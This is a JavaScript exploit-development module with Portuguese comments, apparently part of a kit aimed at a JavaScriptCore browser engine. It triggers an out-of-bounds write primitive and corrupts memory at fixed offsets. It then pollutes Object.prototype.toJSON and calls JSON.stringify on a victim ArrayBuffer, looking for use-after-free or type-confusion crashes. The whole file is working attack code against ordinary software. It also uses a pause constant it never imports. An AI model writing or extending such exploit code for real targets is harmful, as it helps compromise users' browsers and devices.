// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs'; // SHORT_PAUSE_S3 não usado aqui
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // KNOWN_STRUCTURE_IDS não usado aqui

// --- Parâmetros de Teste Configuráveis ---
const SPECULATIVE_TEST_CONFIG = {
    victim_ab_size: 64,
    corruption_offsets: [
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 8,
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 4,
    ],
    values_to_write: [
        0xFFFFFFFF, 
        0x0,        
        0x1,        
    ],
    bytes_to_write_for_corruption: 4, 
    ppKey: 'toJSON', 
    // Adicione stop_on_first_success se quiser parar após o primeiro sucesso especulativo
    // stop_on_first_success: true, 
};
// --- Fim dos Parâmetros ---

export async function testJsonTypeConfusionUAFSpeculative() {
    const FNAME = "testJsonTypeConfusionUAFSpeculative_OriginalFreezing"; // Nomeado para clareza
    logS3(`--- Iniciando Teste Especulativo UAF/TC via JSON (S3) (ORIGINAL CONGELANTE) ---`, "test", FNAME);
    logS3(`   Configurações: victim_size=${SPECULATIVE_TEST_CONFIG.victim_ab_size}, ppKey=${SPECULATIVE_TEST_CONFIG.ppKey}`, "info", FNAME);
    logS3(`   Offsets: ${SPECULATIVE_TEST_CONFIG.corruption_offsets.map(o => toHex(o)).join(', ')}`, "info", FNAME);
    logS3(`   Valores: ${SPECULATIVE_TEST_CONFIG.values_to_write.map(v => toHex(v)).join(', ')}`, "info", FNAME);

    let overallTestSuccess = false;

    for (const corruption_offset of SPECULATIVE_TEST_CONFIG.corruption_offsets) {
        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;

        for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write) {
            if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;

            // ****** PONTO DE INTERESSE PARA DEPURAÇÃO ******
            if (corruption_offset === ((OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16) && value_to_write === 0xFFFFFFFF) {
                logS3("!!! ATINGIDA COMBINAÇÃO CRÍTICA DE CONGELAMENTO (offset 0x70, valor 0xFFFFFFFF) !!!", "critical", FNAME);
                document.title = "CRITICAL COMBO - DEBUG NOW";
                debugger; // Descomente esta linha para pausar o depurador automaticamente aqui
            }
            // ***********************************************

            await triggerOOB_primitive(); 
            if (!oob_array_buffer_real) {
                logS3("Falha ao configurar ambiente OOB. Abortando iteração.", "error", FNAME);
                continue;
            }

            let victim_ab = new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size);
            logS3(` vítima AB (${SPECULATIVE_TEST_CONFIG.victim_ab_size}b) recriado. Off: ${toHex(corruption_offset)}, Val: ${toHex(value_to_write)}`, "info", FNAME);

            const ppKey = SPECULATIVE_TEST_CONFIG.ppKey;
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;
            let currentIterationSuccess = false;
            let stepReached = "inicio_iteracao";
            document.title = `Iter: ${toHex(corruption_offset)}/${toHex(value_to_write)}`;

            try {
                stepReached = "antes_pp";
                logS3(`Poluindo Object.prototype.${ppKey}...`, "info", FNAME);
                document.title = `PP - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
                Object.defineProperty(Object.prototype, ppKey, {
                    value: function() { // Esta é a sua toJSON "v2 - Refinado" original
                        const currentOperationThis = this;
                        // Adicione um contador local se quiser ver o número da chamada
                        // let callCount = (this._toJSON_call_count_ = (this._toJSON_call_count_ || 0) + 1);
                        // if (callCount === 1) document.title = `toJSON C1 - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
                        
                        logS3(`[${ppKey} Poluído] Chamado!`, "vuln", FNAME);
                        logS3(`  typeof this: ${typeof currentOperationThis}`, "info", FNAME);
                        logS3(`  this instanceof ArrayBuffer: ${currentOperationThis instanceof ArrayBuffer}`, "info", FNAME);
                        // ... (resto da sua lógica original da toJSON "v2 - Refinado")
                        let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
                        try {
                            details.byteLength = currentOperationThis.byteLength;
                            if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
                                let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
                                let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
                                if (bufferToView.byteLength >= offsetInView + 4) {
                                   details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
                                } else { /*...*/ }
                            } else { /*...*/ }
                            details.slice_exists = (typeof currentOperationThis.slice === 'function');
                            if (details.slice_exists) { logS3(`  [${ppKey} Poluído] this.slice existe.`, "info", FNAME); }
                            logS3(`  Detalhes: byteLength=${details.byteLength}, 1stDword=${details.first_dword === "N/A (antes da tentativa)" ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME);
                            return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details };
                        } catch (e) {
                            logS3(`  [${ppKey} Poluído] ERRO props: ${e.message}`, "critical", FNAME);
                            currentIterationSuccess = true; overallTestSuccess = true;
                            return { toJSON_error: true, message: e.message, /*...*/ };
                        }
                    },
                    writable: true, configurable: true, enumerable: false
                });
                pollutionApplied = true;
                logS3(`Object.prototype.${ppKey} poluído.`, "good", FNAME);
                stepReached = "pp_aplicada";

                if (corruption_offset >= 0 && corruption_offset + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                    logS3(`CORRUPÇÃO: ${toHex(value_to_write)} @ ${toHex(corruption_offset)}`, "warn", FNAME);
                    stepReached = "antes_escrita_oob";
                    document.title = `OOBWrite - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
                    oob_write_absolute(corruption_offset, value_to_write, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
                    logS3("Escrita OOB feita.", "info", FNAME);
                    stepReached = "apos_escrita_oob";
                } else {
                    logS3(`AVISO: Offset corrupção ${toHex(corruption_offset)} fora dos limites.`, "warn", FNAME);
                    stepReached = "escrita_oob_pulada";
                }

                await PAUSE_S3(MEDIUM_PAUSE_S3); 
                stepReached = "antes_stringify";
                document.title = `Stringify? - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
                logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME);
                let stringifyResult = null;
                try {
                    stringifyResult = JSON.stringify(victim_ab); 
                    stepReached = "apos_stringify";
                    document.title = `OK - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
                    logS3(`Resultado JSON.stringify: ${String(stringifyResult).substring(0, 100)}...`, "info", FNAME);
                    if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_error:true")) {
                        logS3("SUCESSO ESPECULATIVO (toJSON erro).", "vuln", FNAME);
                    }
                } catch (e) {
                    stepReached = "erro_stringify";
                    document.title = `ERRO Strfy - ${toHex(corruption_offset)}/${toHex(value_to_write)}`;
                    logS3(`ERRO JSON.stringify: ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME);
                    currentIterationSuccess = true; overallTestSuccess = true;
                }

            } catch (mainIterationError) {
                logS3(`Erro iteração: ${mainIterationError.message}`, "error", FNAME);
            } finally {
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) {
                        Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                    } else { delete Object.prototype[ppKey]; }
                }
            }
            logS3(`Iteração Concluída (${toHex(corruption_offset)}, ${toHex(value_to_write)}). Sucesso Espec: ${currentIterationSuccess}. Último passo: ${stepReached}`, currentIterationSuccess ? "vuln" : "info", FNAME);
            await PAUSE_S3(SHORT_PAUSE_S3); 
        } 
    } 
    clearOOBEnvironment(); 
    logS3(`--- Teste Especulativo UAF/TC via JSON (ORIGINAL CONGELANTE) Concluído (Sucesso Geral Espec: ${overallTestSuccess}) ---`, "test", FNAME);
}
